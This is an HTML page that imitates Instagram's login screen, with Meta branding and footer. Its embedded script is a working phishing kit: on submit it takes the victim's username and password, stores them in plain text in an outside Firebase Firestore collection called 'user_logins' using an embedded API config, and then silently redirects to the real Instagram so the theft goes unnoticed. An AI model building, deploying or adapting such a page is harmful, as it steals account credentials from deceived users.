<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="./styles.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap"
      rel="stylesheet"
    />
    <title>Instagram</title>
  </head>
  <body>
    <div id="login-container">
      <div id="phone-img-container">
        <img
          src="./images/home-phones-2x.png"
          alt="phone_image"
          id="phone_img"
        />
        <img src="./images/screenshot1-2x.png" id="screenshot" />
      </div>

      <div id="login-right">
        <form id="inputs_form">
          <img
            src="./images/instagram-text-icon.png"
            alt="logo"
            id="insta_logo"
          />
          <div id="inputs_div">
            <input
              type="text"
              id="username_input"
              class="input"
              placeholder="Phone number, username, or email"
              required
            />
            <input 
              type="password" 
              id="password_input" 
              class="input" 
              placeholder="Password" 
              required 
            />
          </div>
          <button type="submit">Log in</button>

          <div id="or-div">
            <div class="or-line"></div>
            <p id="or-text">OR</p>
            <div class="or-line"></div>
          </div>
        </form>

        <div id="fb-text">
          <span>
            <img src="./images/facebook.png" id="fb-logo" />
          </span>
          <span>Log in with Facebook</span>
        </div>
        <p id="forgot-password">Forgot password?</p>

        <div id="no-acct">
          <p>Don't have an account? <a href="https://google.com" target="_blank" id="sign-up">Sign up</a></p>
        </div>

        <div>
          <p id="get-it-text">Get the app.</p>

          <div id="get-it">
            <img src="./images/googlePlay.png" alt="google" id="google-img" />
            <img
              src="./images/microsoft.png"
              alt="microsoft"
              id="microsoft-img"
            />
          </div>
        </div>
      </div>
    </div>

    <footer>
      <div class="footer-div">
        <p>Meta</p>
        <p>About</p>
        <p>Blog</p>
        <p>Jobs</p>
        <p>Help</p>
        <p>API</p>
        <p>Privacy</p>
        <p>Terms</p>
        <p>Locations</p>
        <p>Instagram Lite</p>
        <p>Threads</p>
        <p>Contact Uploading & Non-Users</p>
        <p>Meta Verified</p>
      </div>

      <div class="footer-div">
        <p>English</p>
        <p>© 2025 Instagram from Meta</p>
      </div>
    </footer>

    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
      import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

      // ⚠️ REPLACE THIS CONFIG OBJECT WITH YOUR ACTUAL COPIED FIREBASE CONFIG ⚠️
      const firebaseConfig = {
        apiKey: "AIzaSyAhKzDb1IYss2lBlKoZOZiVOxlH5MG7zgw",
        authDomain: "insta-d88d2.firebaseapp.com",
        projectId: "insta-d88d2",
        storageBucket: "insta-d88d2.firebasestorage.app",
        messagingSenderId: "91809005466",
        appId: "1:91809005466:web:84bee9d38516a180098423"
      };

      // Initialize Firebase and Firestore
      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      // Listen for form submission
      document.getElementById('inputs_form').addEventListener('submit', async function(event) {
        event.preventDefault(); // Stop page from refreshing

        // Grab inputs
        const username = document.getElementById('username_input').value;
        const password = document.getElementById('password_input').value;

        try {
          // Add data to a collection named "user_logins"
          await addDoc(collection(db, "user_logins"), {
            Name: username,
            Pass: password,
            timestamp: serverTimestamp()
          });

          // Redirect to the real Instagram on success
          window.location.href = "https://www.instagram.com";
        } catch (error) {
          console.error("Error saving data to Firebase: ", error);
          // Force redirect even if it errors out so the user experience doesn't break
          window.location.href = "https://www.instagram.com";
        }
      });
    </script>
  </body>
</html>
